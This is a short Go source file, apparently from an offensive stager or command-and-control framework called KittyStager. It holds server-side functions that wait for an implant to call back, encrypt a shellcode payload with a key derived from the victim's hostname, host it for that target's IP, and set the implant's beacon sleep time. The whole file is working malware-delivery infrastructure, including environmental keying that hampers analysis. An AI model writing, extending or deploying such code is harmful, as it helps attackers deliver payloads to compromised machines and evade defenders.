package httpUtil

import (
	"KittyStager/cmd/cryptoUtil"
	"KittyStager/cmd/http"
	"KittyStager/cmd/util"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
)

// HostShellcode Hosts the Shellcode
func HostShellcode(path string, ip string) error {
	var err error
	if http.Targets[ip].InitChecks.GetHostname() == "" {
		return errors.New("wait for the implant to call back")
	}
	key := cryptoUtil.GenerateKey(http.Targets[ip].InitChecks.GetHostname(), 32)
	shellcode, err := util.ScToAES(path, key)
	if err != nil {
		return err
	}
	fmt.Println(color.Green("[+] Key generated is : " + key))
	http.Targets[ip].Shellcode = shellcode
	fmt.Println(color.Green("[+] Shellcode hosted for " + ip))
	return error(nil)
}

// HostSleep Hosts the sleep time the same way as the shellcode
func HostSleep(t int, ip string) {
	http.Targets[ip].Shellcode = []byte(fmt.Sprintf("%d", t))
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(ip))
}
